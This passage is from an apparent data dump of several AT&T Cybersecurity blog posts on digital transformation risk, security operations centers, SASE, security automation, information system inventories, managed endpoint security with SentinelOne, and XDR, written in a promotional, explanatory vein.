of customer data, intellectual property, and sensitive company information. \n\n As the threat landscape continues to intensify, an organization\u2019s key stakeholders need to understand the security risks inherent with digital transformation. The hard truth is this: it\u2019s not a matter of  if  your company will be breached, but  when.  According to a 2020  Ponemon Digital Transformation and Cyber Risk report , 82% of respondents in IT security and C-level executives experienced at least one data breach as a result of digital transformation.\u00a0 \n\n As if cybersecurity in digital transformation wasn\u2019t already complex enough, the increased reliance on third-parties exacerbates the risk. Despite the importance of third-parties for a successful digital transformation, 58% of Ponemon respondents lack a third-party cyber risk management program such as network segmentation, as part of a Zero Trust framework, to give access to only the required portions of the network. Remember, when operational data and confidential information are exchanged with third-parties, that data and information are vulnerable to misuse and exploitation.  Third-party risk management  should be an essential ingredient in your secure digital transformation recipe.\u00a0\u00a0 \n\n No matter where you are in your digital transformation journey, you need to make sure that your security team (and relevant stakeholders) know about the most effective cybersecurity solutions available. One model that is provind use in DX journeys is Secure Access Service Edge (SASE). SASE is an architecture model or framework that combines software-defined wide-area networking (SD-WAN) with comprehensive security functions to support digital transformation efforts and an evolving workforce. \n\n You can learn more about both Zero Trust \u00a0SASE  here . \n\n It bears repeating that no matter how much you invest in digital \u00a0transformation technologies, they cannot be successful if they do not protect your business, customers, or other vital assets. \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t",

        "text": "\n\t\t\t\t\t\t\t\t\t This article was written by an independent guest author. \n\n If you\u2019re responsible for stopping cyber threats within your organization, your job is more challenging than ever. The exposure to threats for any organization continues to escalate, and breaches are occurring every day. \n\n Consider: \n\n \n\t The average cost of a data breach is approximately $3.92M \n\t On average, it takes 280 days to identify and contain a breach \n \n\n If your company doesn\u2019t have a security operations center (SOC), it may be time to change that. In fact, a recent study indicates  86% of organizations rate the SOC as anywhere from important to essential  to an organization's cybersecurity strategy. \n\n What is a SOC? \n\n The  security operations center  (SOC) identifies, investigates, prioritizes, and resolves issues that could affect the security of an organization\u2019s critical infrastructure and data. A well-developed and well-run SOC performs real-time threat detection and incident response, allowing SOC analysts to rapidly deliver security intelligence to stakeholders and senior management. \n\n The  SOC framework  was introduced by The Open Web Application Security Project (OWASP), a nonprofit foundation established to improve software security as a means for responding to cybersecurity incidents. The framework includes technical controls (Security Information and Events Management (SIEM) systems), organizational controls (processes), and also includes a human component (detection and response). \n\n Perhaps the most crucial function for a SOC involves a detailed and ongoing attack analysis. This means gathering and reporting on attack data that provides answers to these questions: \n\n \n\t When did the attack start? \n\t Who is behind the attack? \n\t How is the attack being carried out? \n\t What resources, systems, or data are at risk of being compromised or have already been compromised? \n \n\n A proactive and reactive mechanism  \n\n Beyond attack analysis, the SOC also provides critical cybersecurity functions that should be a cornerstone for every business today: prevention, detection and response. \n\n An effective SOC prioritizes a proactive approach rather than relying on reactive measures. The SOC typically works around the clock to monitor the network for abnormal or malicious activity, which might stop attacks before they happen. \n\n How does this work? SOC analysts are well-equipped to prevent threats because they have access to comprehensive network data and possess up-to-date intel on global threat intelligence stats and data covering the latest hacker tools, trends, and methodologies. \n\n When it comes to response, think of the SOC as a first responder, carrying out the critical actions that \u201cstop the bleeding\u201d from an attack. When the incident is over, the SOC will also assist or lead restoration and recovery processes. \n\n What are the goals of a well-functioning SOC? \n\n A well-functioning SOC provides a multitude of benefits, but in order to get the most out of your security operations center, you\u2019ll need to ensure you have experienced personnel to make up the team. For some companies, forming a SOC in-house is practical because they have dedicated security staff. For most organizations, however, a managed SOC is often an attractive solution. We\u2019ll discuss managed SOC in the next section. \n\n No matter how your company approaches SOC, you\u2019ll want to make sure it meets the following goals: \n\n Improve your security visibility \nA good SOC operator is always looking to expand the company\u2019s security visibility by maintaining an extensive inventory of all IT assets. The more concrete information they have about your systems and resources, makes identifying attacks against them much easier. The ability to harness near-real-time security monitoring data allows the SOC to be prepared if and when a threat happens. \n\n Reduce incident response time \nToday\u2019s well-functioning SOC should be able to boost the speed of attack detection, investigation and remediation. The  average time  to identify and contain a breach is 280 days, so your organization should consistently strive for improved incident response times. When attackers don\u2019t have the time to poke around your systems, they\u2019ll either move on to the next victim, or, at worst, won\u2019t be able to steal enough valuable data. \n\n Minimize the impact of a breach  \nJust as important as reducing the incident response time, minimizing the organizational impact of a breach is another critical goal of the SOC. Leveraging threat intelligence and clear visibility into an organization\u2019s assets, the SOC can play a huge role in preventing a small breach from blowing up into something more significant. \n\n Maintain a consistent flow of reporting and communication  \nToday\u2019s SOC is actively involved in the organization\u2019s communication channels, keeping all stakeholders informed of financial and business risk. Data collected from the SOC can also help build security roadmaps for future planning. \n\n Stay a step ahead of attackers \nWhile all the reactive goals above are essential for a robust SOC, the best SOC operators and analysts also devote some of their efforts toward more proactive threat hunting. Smart hackers are always one step ahead, and the only way to keep up is to dive deep into the data and look for evidence of an early attack. In many cases, before an intrusion or attack is detected, the digital clues indicating a future attack are there to be discovered in the data. \n\n The benefits of having your SOC managed by a third party \n\n As mentioned above, the benefits of a well-functioning SOC can only be gained with a skilled staff. But that\u2019s not the only thing holding organizations back from leveraging SOC to improve their security posture. The ability to tap into effective threat orchestration and automation of threat detection and response are equally important. With managed SOC, or SOC-as-a-service, companies get access to a wide range of cybersecurity experience from a talented pool of security analysts\u2014without the hefty labor costs. \n\n Like other managed cybersecurity services, many companies prefer the flexibility offered by a subscription service model. \n\n Managed SOC essentially takes the concept of a fully-functioning internal SOC and turns it into an external cloud-based service. A managed SOC offers 24x7 monitoring without the significant additional investment in cybersecurity hardware, software, and other infrastructure.\u00a0 \n\n Finally, with a managed SOC service like   AT&T Cybersecurity SOC as a Service , your organization can gain the following advantages: \n\n Reduce cost and complexity with centralized security visibility \n\n \n\t Ability to monitor SaaS, Cloud, on-premises, and endpoints through a single pane of glass \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \n\t Avoid the cost, complexity and confusion of maintaining multiple security products \n \n\n Detect threats from day one  \n\n \n\t Gain immediate and broad visibility across your entire environment within minutes of installation \n \n\n Threat intelligence: staying ahead  \n\n \n\t Keep up to date with emerging and evolving threats, letting the managed service partner do all the research \n \n\n Faster, orchestrated threat response \n\n \n\t Know where to focus and how to take action \n\t The SOC analyst team works side-by-side with your incident responders to help you respond quickly and effectively \n \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t",

        "text": "\n\t\t\t\t\t\t\t\t\t This blog was written by a third party author \n\n Today\u2019s \u201cnew normal\u201d business environment is heavily focused on cloud. The ongoing trends we\u2019re seeing today show no signs of letting up. Workloads moving to the cloud, an escalating number of devices accessing applications and data, and the more distributed nature of the workforce have been accelerated by last year\u2019s global health events. \n\n While security centered on the data center makes deployment and management easy, in today\u2019s modern environment this hub and spoke model isn\u2019t as effective. With the increased amount of traffic flowing over the network links before heading out to the internet, combined with a growing number of employees working from branch office or remote locations, the latency is overwhelming. \n\n Secure access to services needs to be everywhere, not just at the datacenter. This is where Secure Access Service Edge (SASE) comes in.\u00a0 \n\n What is secure access service edge (SASE)? \n\n SASE (pronounced \u201csassy\u201d) is a cloud-based model or architecture that addresses the limitations of the traditional \u2018hub-and-spoke\u2019 network infrastructure that connects users in multiple locations (spokes) to resources hosted in centralized datacenters (hubs), hosting the applications and data. Accessing those resources either requires a localized private network or a secondary network connecting to the primary network via secure leased line or VPN. \n\n Problems with hub-and-spoke \n\n In theory, the hub-and-spoke model is simple. However, the model cannot handle the complexities involved with cloud-based services like software-as-a-service (SaaS) and escalating distributed workforces. As more workloads, applications, and sensitive corporate data move to the cloud, organizations must re-evaluate how and where network traffic is inspected and how secure user access policies are managed. \n\n Rerouting all traffic through a centralized data center isn\u2019t practical (due to latency) when many applications and data are hosted in the cloud. Adding to the latency issue, remote users may suffer when using a VPN to connect to a corporate network. It\u2019s not uncommon for frustrated users to instead access company resources over an unsecured connection, exposing themselves to additional security risks. \n\n SASE to the rescue \n\n Enter SASE, which places network controls on the cloud edge as opposed to the corporate data center, closer to the service being accessed. SASE implementations do away with layered cloud services requiring separate configuration and management\u2014streamlining network and security services to create a secure, seamless network edge. \n\n One of the key features of SASE is the use of identity-based,\u00a0zero trust access policies\u00a0on the edge network. With it, organizations can provide specific access to only the applications and data users need to complete their job duties, without having to connect to the network via VPN. The enterprise gains more granular control over network security policies and can do away with legacy hardware like VPNs and firewalls. \n\n The best of today\u2019s security functions \n\n To support the ever-changing secure access needs of many organizations today, SASE incorporates various network security functions like secure web gateway (SWG), cloud access security brokers (CASB), firewall-as-a-service (FWaaS) and Zero Trust Network Access (ZTNA). These capabilities are delivered along with SDWAN and are primarily \u201cas-a-service,\u201d utilizing the identity of the connecting user or device, real-time context and security or compliance policies. \n\n Essentially, SASE is a new package of security functions that includes the aforementioned technologies as core abilities. Using these security functions, examples of what the SASE model can accomplish for organizations include identifying sensitive data or malware (using DLP), decrypting content at line speed (using NGFW, SWG or SSL/TLS decryption appliances) and continuously monitoring sessions for risk and trust levels. \n\n \n     \n         \n\n         \n             AT&T Secure Access Service Edge (SASE) \n\n             AT&T Business combines leading managed SD-WAN services, cybersecurity capabilities, and the power of 5G to deliver cutting edge SASE solutions. \n             Learn more \n         \n     \n \n\n What are the goals of SASE? \n\n The main goal of the SASE framework is to help modernize networks and security to keep up with the ever-evolving business requirements. In doing so, SASE provides unified security across users, wherever they do business, and provides visibility and control over what can be accessed. \n\n According to Gartner, organizations that implement SASE should adopt the CARTA (Continuous Adaptive Risk and Trust Assessment) strategic approach. With CARTA, in order to obtain effective risk and cybersecurity management, you will need: \n\n \n\t Complete device visibility and automated control \n\t Micro-segmentation of networks to reduce lateral movement and contain breaches \n\t Continuous monitoring, assessment and remediation of cyber and operational risk \n\t Products and solutions from multiple vendors, with new levels of orchestration, automation and response \n\t Securely and effectively manage agentless IoT devices and operational technology (OT systems) \n\t Discovery, posture assessment and remediation/control of physical and virtual devices as well as cloud infrastructure and workloads \n \n\n Key to implementing CARTA, and in turn SASE, is adopting a Zero Trust approach. The strategy of \u201cVerify, then trust\u201d as opposed to trusting by default is critical. With Zero Trust, you assume your network has been compromised, and users and devices must prove they are who or what they say they are. Even if users or devices are already located within the network perimeter, strict identity verification is required. \n\n At a high level, the ultimate goal for businesses who wish to adopt SASE is this: leveraging cloud-centric technology to reduce operational burdens and costs, and in doing so, reducing threats to the organization. \n\n The key technologies that make up a SASE architecture \n\n It is important to understand that SASE architecture isn\u2019t tied to any vendor or solution, and aims to provide the most flexible security infrastructure possible. The following security and network components make up SASE architecture. \n\n \n\t Secure Web Gateway  (SWG)  for traffic inspection to protect users from malicious sites and enforce access policies \n\t Firewall as a Service  (FWaaS)  for  next-generation firewall  (NGWF) capabilities to protect the network against a wide range of modern threats. Not only does NGFW defend assets, such as servers hosted in the data center, but also users that work on-site or connect via VPN. \n\t Cloud Access Security Broker  (CASB)  for an additional layer of support to ensure network traffic between on-premises devices and cloud providers comply with an organization's security policies \n\t Zero Trust Network Access   (ZTNA)  solutions for seamless and secure connectivity to applications without placing users on the network or exposing applications to the internet or relying on legacy solutions. \n\t SD-WAN   for saving WAN costs and securing IoT devices. From one pane of glass, SD-WAN allows organizations to see and manage the data flows across all internet circuits and provides the ability to prioritize bandwidth to business-critical applications. \n \n\n Benefits of SASE for a business \n\n The SASE model encourages businesses to consolidate these core technologies with fewer vendors. Ideally, they would be managed from a single portal. \n\n More specifically, the benefits of implementing a SASE architecture in an organization include: \n\n \n\t Latency-optimized routing  \u2014 SASE helps reduce latency by routing network traffic across a global edge network. At the edge, data and network traffic are processed closer to the user or device. \n\t Lower costs and complexity  \u2013 By consolidating vendors and technology stacks, costs and complexities can be reduced. \n\t Agility  \u2013 New digital business scenarios with quicker adoption are viable with less risk exposure and less operational overhead. \n\t More easily enable ZTNA  \u2013 Allow secure network access based on the identity of the user, device, or application with end-to-end encryption. \n\t Centralized policy, local enforcement  \u2013 Gain cloud-based centralized management while maintaining a distributed enforcement of policies. \n \n\n At the end of the day, when implemented properly, SASE allows organizations to attain cloud-centric technology, reduce the operational burden and cost, and improve security and reduce threats. Remember, SASE is not something you can buy off the shelf and there are many ways to assemble a SASE solution. \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t",

        "text": "\n\t\t\t\t\t\t\t\t\t This blog was written by an independent guest blogger. \n\n Enterprises and small businesses alike are facing challenges that impact their ability to maintain adequate cybersecurity. Budget constraints and limited staff are just a couple of reasons why businesses have become more susceptible to cyberattacks. Hackers are becoming smarter, and the tools that teams deploy are growing in number, leading to fragmentation and increased vulnerabilities.\u00a0 \n\n According to the IBM data breach report, the average cost of a data breach has reached  $4.24 million per incident , an all-time high. There are many reasons for this increase, but one reason that businesses must confront recently is the drastic operational shifts during the pandemic that have led to higher recovery costs.\u00a0 \n\n Cybersecurity automation trained with machine learning and powered by AI is helping to  close vulnerability gaps  and lower the cost of cybersecurity incidents. If your organization is new to automated security, then it's best to start small and increase the scope of your implementation over time. Use this guide to help navigate the needs of your organization and decide what next steps to take in order to implement an automated cybersecurity protocol.\u00a0 \n\n The business case for automation \n\n The upcoming holiday season presents a unique cybersecurity threat for businesses in addition to individual consumers. More online retailers are offering Black Friday, Small Business Saturday and Cyber Monday deals to maximize profits and expect to see a  107% revenue boost  over the holiday shopping weekend. This increased traffic presents an opportunity for hackers and fraudsters to slip under the radar and execute devastating cyberattacks.\u00a0 \n\n The  number one reason  why more companies are turning to cybersecurity automation is due to the rise of advanced persistent threats. APTs most commonly describe an attack campaign where a team of attackers establishes a prolonged presence within a network that is difficult to discover without continuous monitoring tools. This kind of presence is easy to establish in an organization that has suffered attacks before or is otherwise focused on other business operations.\u00a0 \n\n Because of this, organizations are pushing for more automation to secure their networks and assets. According to a recent report on cybersecurity adoption,  95% of businesses  have already automated some of their cybersecurity processes and 98% are planning to automate even more of their processes in the upcoming year. Of those who have already started, 40% have automated at least half of their processes. \n\n Business functions to automate for better security\u00a0 \n\n Automating business functions helps increase security while also streamlining workflows and freeing up employees to focus on productivity and revenue-based activities. Without the help of AI, many companies are struggling to keep up with rising customer demands for speed as well as the rising need for privacy and security.\u00a0 \n\n Here are just some of the functions that businesses can automate to increase overall cybersecurity:\u00a0 \n\n Incident response \n\n Cybersecurity automation gives organizations the ability to perform threat detection and incident response at scale. AI-powered intelligent automation requires large amounts of data in order to be most effective, so machines that have been developed over time are becoming powerful enough to analyze vulnerabilities and respond to incidents in real time. By automating tedious and repetitive security tasks, response time is expedited while reducing alert fatigue and human error.\u00a0 \n\n Data management \n\n Many security professionals spend hours each day manually administering tools to protect enterprise data. For many organizations, spending so much time collecting data is not conducive to innovation and growth. Automating tasks such as data collection and  log and asset management  can make security operations more efficient by freeing up skilled employees to work on high-level tasks that require a human touch.\u00a0 \n\n Data privacy \n\n Another way for businesses to streamline workflows is to automate data privacy functions such as compliance. AI-powered tools have the ability to navigate your ecosystem and  discover non-compliant processes and activities  without the need for a full-scale audit. Regulations are beginning to catch up with those in the EU, so staying on top of regulatory compliance is essential to prevent disruptions and down time as well as keep systems secure from prying eyes.\u00a0 \n\n Attack simulations \n\n Another part of cybersecurity that is traditionally very time consuming is testing. Conducting simulated attacks and vulnerability tests is crucial for maintaining a secure cybersecurity ecosystem, but the time consuming process causes many organizations to put it off or test less frequently than they should.\u00a0 \n\n But now, continuous attack simulations can be used to increase data center security. These automated simulations  recreate adversarial behavior  in order to discover processes and controls that are performing well and which need to be patched up.\u00a0 \n\n APIs and certificates \n\n Enterprises have no choice but to manage upwards of thousands of security certificates. This volume of certificates is virtually impossible for teams to manage without the help of AI-powered tools. Because of this, it is not uncommon for businesses to experience outages caused by certificates expiring unexpectedly. That\u2019s why most companies are now looking to automate their PKI certificate management processes.\u00a0 \n\n Application security \n\n Cybersecurity automation also allows companies to secure all of their applications easily. This includes checking for authentication, authorization, and even encryption protocols. Automated tools can also scan business applications for known security vulnerabilities. \n\n A manual approach is no longer sustainable. This is due to DevOps deployments continuing to increase as more companies are utilizing low code and no code tools and APIs. Additionally, each manual step creates unnecessary risk through human error that can lead to a security breach.\u00a0 \n\n Tips for implementing cybersecurity automation \n\n \n\t Implement  zero trust protocols . A restrictive policy when it comes to network access protects business data from internal and external threats.\u00a0 \n\t Keep your certificates up to date. As web developer Nathan Finch from Best Web Hosting Australia makes note of, ensuring your web hosting provider  comes with SSL  is absolutely essential. \u201cSSL or Secure Socket Layer protection creates an encrypted tunnel from your user\u2019s computer to the web servers,\u201d says Finch. This protects their information from hackers and other malicious forces. It has become a requirement for any financial transaction online as well as any payment processor worth using. These processors will flat out reject any websites that don\u2019t have SSL.\u201d \n\t Utilize managed services. In the event that a threat is detected, managed security services can automate and orchestrate rules to  accelerate incident response  time. In addition, your organization will also have a team of security professionals that can help your IT security identify and mitigate threats in real time.\u00a0 \n \n\n Conclusion \n\n While  technologies like cloud computing and 5G  were created with security in mind, there are still a number of ways that businesses can fall victim to costly cyberattacks. By automating business processes such as incident response, data management, data privacy, attack simulations, APIs, certificates, and application security can all lead to a more efficient and secure business environment. \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t",

        "text": "\n\t\t\t\t\t\t\t\t\t IT asset inventory vs an ISI \u2013 What\u2019s the difference?\u00a0 \n\n Many frameworks, standards, and regulations require organizations to have an IT Asset Management program in place. However, the understanding of what separates a mature Information System Inventory (ISI) from an IT Asset Inventory and the benefits realized from an ISI are generally less well understood. Naturally this may lead to a higher likelihood of deprioritizing an ISI in favor of what are viewed as more pressing security needs. \n\n \n\n Figure 1.  An Information System Inventory (ISI) is a record of Information Systems in an organization and includes information traditionally in an IT Asset Inventory. \n\n But a properly constructed ISI should be prioritized as the foundation on which organizations implement a System Development Lifecycle (SDLC) program, facilitate Security Operations activities, make informed risk management decisions, move towards a more data centric view of security and mature their security posture as a whole. The ISI is an opportunity for an organization to have a core source of intelligence that ties security information across the organization together. Having the ability to view risk at multiple levels (network level, system level, division level, organizational level etc.) is becoming ever more important as organizations implement more complex environments and move away from a traditional network perimeter. \n\n Policy, process & training: Ensuring reliable information \n\n One of the best places to start maturing the ISI is to mature the categorization process. Without measures in place to ensure repeatability and consistency, information may become suspect and of little value. \u00a0It is critical to implement a process that satisfies the need for stringent accuracy, but that is not so cumbersome it makes efficient use of personnel resources difficult. One of the most effective ways to balance this need for accuracy with the need for agility, is to invest significant time in process creation, documentation, and training. This includes defining and documenting the process itself, definitions for each field and each possible field answer, and the creation of tools such as interview templates and forms. \n\n Utilizing training sessions and tabletop exercises then ensure all interviewers implement the processes in a consistent and accurate manner. As categorizations are conducted on an annual or recurring basis, it is important to continuously update the process documentation, definitions, and training to align with the implemented process. \n\n \n\n Figure 2.  A possible process for categorizing an Information System \n\n It is also important to design the categorization process to allow for documentation of reasoning behind critical fields. Besides the obvious benefit of providing a high level of confidence that the information is accurate and easing the quality assurance process, this also has the added benefit of capturing inevitable grey areas and edge cases not considered in the original process. As the organization continues to mature their ISI and the categorization process evolves, notes on previously categorized systems are also invaluable in backfilling information for newly identified business uses. This reduces re-work required, helps ease maintenance of the ISI, and provides a more accurate picture of current risk. \n\n \n\n Figure 3 . A short list of possible categorization fields and reasoning fields for critical fields. \n\n Shared responsibility of categorizing a system \n\n As an Information Security professional, the interviewer\u2019s role is to provide guidance to the Information Owner. Interviewees (Information Owners) have authority over the system and system\u2019s risk but are often senior representatives in departments outside of IT. Information Owners rely on correct categorizations for management of risk but may not be familiar with more technical categorization questions and fields. Therefore, the responsibility for accuracy relies on both Information Security and the Information Owner; Information Security asks probing questions, educates, documents, and provides recommendations while the Information Owner provides information about the system and has authority over the categorization values. \n\n For an Information Security department to achieve its goals, it is essential for non-Information Security departments to be cooperative and collaborative. This is especially true for organizations where the IT department has traditionally assumed all risk for all information systems. When undergoing a cyber-transformation such as a shift in risk ownership, there is often resistance from new risk owners. Information Security should use categorizations as an opportunity to build valuable working relationships with external departments, position Information Security as a business enabler, and mitigate some of the resistance expected with cybersecurity transformations. \n\n \n\n Figure 4.  Split responsibility shown between the interviewee (Information Owner) and interviewer (Information Security) in making a correct selection on the FIPS 199 Availability rating. Explaining why categorization choices are made and why it is positive is a great way to help build a working relationship. \n\n Plan for unknown discoveries \n\n Expect to find more systems than were planned for. This is especially true for organizations where Information Security is not separate from the IT department, organizations where less mature System Development Life Cycle (SDLC) processes are in place, and organizations where a significant number of cloud systems are utilized. According to a  Frost & Sullivan Stratecast SaaS survey , \u201cexpect that upwards of 35 percent of all SaaS apps in your company are purchased and used without oversight\u201d. Plan for even higher percentages of unknown systems in organizations that meet more than one of the criteria above. Ensure development of a plan for what to do with discovered systems that are abandoned, un-owned, or partly retired. There is a risk with these systems that must be measured and tracked, however not all business information may be available in the same manner as systems with Information Owners and Information Custodians. \n\n A system for systems \n\n In order to gain maximum risk-management insight out of the ISI, the information within the ISI should tie together different data sources, be easily usable, and show supported business processes. Configuration Management Database (CMDB) tools are designed to best accomplish this task. CMDB tools often include automation and orchestration features that allow linkages and relationships between assets to be automatically populated and maintained. This then allows for a near real time display of risk. \u00a0Although it is theoretically possible to do this without a CMDB, in practice the manual work required to manually create and maintain thousands of relationships usually make it time/labor prohibitive. \n\n Creating intelligence \u2013 Linkages, automation and dashboards \n\n An ISI within a CMDB gives the ability to link the business level information identified within the categorization meeting, to the system components it is built on. Each Information System is able to then be connected to business objectives and services. The ISI allows for aggregation of data at a system and organizational level that is leveraged across information security functions in support of vulnerability management, continuity planning, incident response, disaster recovery, compliance and more. \n\n \n\n Figure 5/6 . Sample inputs for a single high-risk system (top) and display of a possible risk overview dashboard (bottom). \n\n The value that the ISI brings to the business is realized when information is able to be aggregated and tied together in a digestible way. While some dashboards are valuable to nearly all organizations (ex: server risk, production system risk, organizational risk etc.) each organization should tailor custom dashboards to best suit their needs. The creation of custom dashboards is often what separates information collection from actionable intelligence. Because actionable intelligence is at the root of business value, an organization with ISI\u2019s in CMDBs should invest significant time and personnel resources in the development of tailored views, custom reports, and automation/orchestration workflows. \n\n Once dashboards and linkages are set up properly, it allows for a significant level of system exploration \u2013 the lowest levels of information systems are tied to software versions, vulnerabilities, impact levels, information owners, recovery timelines, and business impacts. There are many use cases for this intelligence depending on the information collected and may include Compliance Monitoring, Vulnerability Management Monitoring, Third Party Risk Management, Change Management, Network/System Topology, Incident Response, and Disaster Recovery. \n\n Consider an Incident Response & Disaster Recovery use case displayed in Figure 5 below. Several benefits are realized from when an incident is first identified in an organization\u2019s Security Information and Event Management (SIEM) to when the incident is closed out. The server is tied to the business process it supports. The CISO is automatically notified for any incident impacting a critical business process and then utilizes the ISI for near real time updates. Current and potential future business impacts are communicated to business stakeholders. Critical priority Incident Response tickets are automatically opened on the assets identified in the SIEM. High priority investigation tickets are automatically opened for the rest of the system\u2019s assets and for systems with direct connections to the compromised system. If any disaster recovery is required, systems are prioritized based off classification values in the ISI. When the investigation is concluded and the risk has been managed to an acceptable level, the ISI displays required public or private breach disclosure actions. \n\n \n\n Figure 7 . Sample Incident Response & Disaster Recovery use case where green boxes indicate significant benefit from a mature ISI. \n\n ISI business value realized \n\n Categorizations in which Information Systems are defined, and business level information gathered are a key step in developing or maturing an ISI. Some resistance to cyber-transformation (ex: shared responsibility of categorizations and system risk ownership transference) may be able to be mitigated by treating categorizations as an opportunity to establish working relationships between Information Security and external departments. An organization matures their categorization process by spending sufficient time on documentation and personnel training activities. An organization should plan for discovery of previously unknown systems and using a CMDB to allow for linkage of business level and categorization level information down to information system assets. By creation of tailored dashboards and orchestration, organizations have the ability to facilitate Information Security activities across the organization. \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t",

        "date": "April 19, 2021 | ",
        "text": "\n\t\t\t\t\t\t\t\t\t With 5G, edge solutions, and digital transformation all around us, every enterprise should be taking a closer look at their endpoint security and evaluate options that will be able to keep pace with this dynamic new environment.The newly introduced\u00a0\u00a0AT&T Managed Endpoint Security with SentinelOne\u2122\u00a0offer brings world class managed services with comprehensive endpoint security. \n\n SentinelOne brings best-of-breed Endpoint Protection Platform (EPP) and Endpoint Detection and Response (EDR) with deep integration into the AT&T Unified Security Management (USM) platform and Alien Labs Open Threat Exchange (OTX). This deep integration, along with AT&T\u2019s 500+ partner integrations, can provide businesses Extended Detection and Response (XDR) capabilities from the endpoint to the network to the cloud. Plus, through the AT&T Security Operations Center, businesses can rely on world class monitoring and management of their endpoints. \n\n Here are the unique benefits it can bring to enterprises: \n\n Industry leading technology \n\n Joining forces with the best of the best is crucial especially when it comes to endpoint security. AT&T has teamed up with SentinelOne who provides next-generation endpoint security combining antivirus, EPP, and EDR into one agent. SentinelOne has been highly recognized in the industry and was number 1 in the  2020 MITRE ATT&CK test - APT 29  for most total detections and most correlated alerts through comprehensive storyline technology. \n\n This autonomous agent utilizes Artificial Intelligence (AI) and machine learning (ML) to help protect against known and unknown threats and eliminates reliance on external factors for protection. This faster, \u201cmachine-speed\u201d detection & response provides continuous protection, even when offline. And, in the event of an attack, the SentinelOne agent can perform 1-click remediation and rollback with no custom scripting or re-imaging required. \n\n Deep integration with AT&T\u2019s USM platform and Alien Labs OTX \n\n AT&T Cybersecurity and SentinelOne bring one of the most unique combinations in the market via the deep integrations between the SentinelOne platform and the AT&T USM platform. This deep integration allows for orchestrated and automated incident response on the endpoints. \n\n Additionally, deep integrations were built between the world\u2019s largest open threat intelligence community, AT&T Alien Labs Open Threat Exchange (OTX), and the SentinelOne agent. The AT&T Alien Labs OTX encompasses over 145,000 security professionals submitting over 20 million threat indicators per day. Additional context is provided from the USM sensor network with an additional 20 million threat observations per day and AT&T\u2019s Chief Security Office analyzing over 446 PB of traffic from 200 countries and territories. By correlating the incidents of compromise from AT&T Alien Labs OTX, AT&T is able to deliver added context that allows for faster responses. These same AT&T Alien Labs detections and threat intelligence also informs threat hunting on SentinelOne\u2019s EDR data to help yield richer insights and easier detection of evasive threats. \n\n Expert management \n\n As  one of the world's top MSSPs , AT&T Cybersecurity employs highly experienced and industry certified individuals for the Managed Endpoint Security with SentinelOne offering. AT&T brings over 25 years of experience in delivering managed security services and knows what it takes to keep pace with the dynamic threat landscape. To stay ahead, AT&T\u2019s security analysts maintain security certifications including GSE, CISSP, CEH, and more.\u00a0 \n\n For the Managed Endpoint Security with SentinelOne offering, AT&T provides high touch service delivery through platform onboarding, initial policy tuning, and training. Most importantly though, AT&T helps the customer build a custom incident response plan (IRP). This IRP will be the blueprint for how to respond to an incident and the importance of this plan cannot be understated. In fact, in Ponemon\u2019s\u00a0 Cost of a Data Breach Report , they compared organizations who had an IRP versus those that did not and found that those with a plan reported less breach-related costs by an average of $2 million. AT&T will help with this IRP and meet regularly to adjust this plan based on new threat intelligence. \n\n Finally, AT&T\u2019s Security Operations Center will provide continuous monitoring, management and support for the Managed Endpoint Security with SentinelOne offering. This includes 24x7x365 eyes on glass to review and triage alarms as well as investigate and respond to threats. This helps alleviate the burden of keeping up with threats and helps reduce the risk of a compromise. With this added team of experts, security staff can be redeployed towards other important security functions and help overcome the cyber-skills shortage. \n\n Cohesive managed solutions \n\n This new offering, with its deep integrations, helps customers on their journey to XDR. Through the AT&T USM platform, AT&T is able to manage multiple AT&T offers for even greater protection. AT&T utilizes the same SOC analyst team to monitor and manage these two distinct threat detection technology stacks. This extends alert correlation across the organization\u2019s network to add context, provide better detection, and orchestrate response. This single point of contact for both solutions simplifies the experience and helps further enable XDR. \n\n Trusted advisors \n\n A trusted advisor can help customers proactively identify areas of cyber risk and take preventive measures to help protect critical assets. AT&T Cybersecurity can help with design, service delivery, and management of end to end security- from the endpoint to the network to the cloud.\u00a0 \n\n An experienced and vigilant managed security services provider can help detect cyber threats early, and provide coordinated defenses for fast and effective response, helping to mitigate impact to the business. Through the AT&T Managed Endpoint Security with SentinelOne offer, enterprises can reduce the cost and complexity of protecting their endpoints and be prepared to adapt and scale as the business takes on digital transformation. \n\n AT&T Cybersecurity is extremely excited to introduce the new  Managed Endpoint Security with SentinelOne .\u00a0 Please reach out to us for more information on this groundbreaking new service offering. \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t",

        "text": "\n\t\t\t\t\t\t\t\t\t This blog was written by an independent guest blogger. \n\n \n\n \u00a0 Image source \n\n Business technology generally advances on a rapid basis, however, so do the cyberthreats that can endanger your security. \n\n According to  BusinessWire , more than half of enterprises believe that their security cannot keep up, and according to  IBM News Room , more than half of organizations with cybersecurity incident response plans\u00a0fail to test them. \n\n Because of overloaded security teams, poor visibility, and threat alert overload due to the many implemented technologies in place to fight this, for many of these enterprises, the difficulty constantly grows when it comes to detecting and effectively  responding to cyber threats . \n\n What is XDR? \n\n XDR can be defined as a cross-layered detection and response tool. In other words, it collects and then correlates data over a variety of security layers, such as endpoints, emails, servers, clouds, and networks. \n\n What this means is that, rather than focusing on end-point detection alone, it can enable your security team to detect, investigate, and respond to threats  across multiple layers of security , not just the end-point. \n\n This is due to the fact that today\u2019s  cyber threats  are extremely tricky and complex, to the point where they can hide throughout different layers within an organization. \n\n If you were to use a sideload approach, through the usage of different technologies, simply cannot provide a contextual view of all of the threats across the environment, and as such, can slow down the detection, investigation, and response. \n\n It allows for improved protection, detection, and response capabilities as well as improved productivity of the operational security personnel, with lower costs associated with owning it. \n\n \n\n Image source \n\n XDR features \n\n XDR was designed to simplify the security visibility across an organization\u2019s entire cyber architecture. In other words, to allow an organization to analyze all of the layers associated with their security, not just the end-point, through an  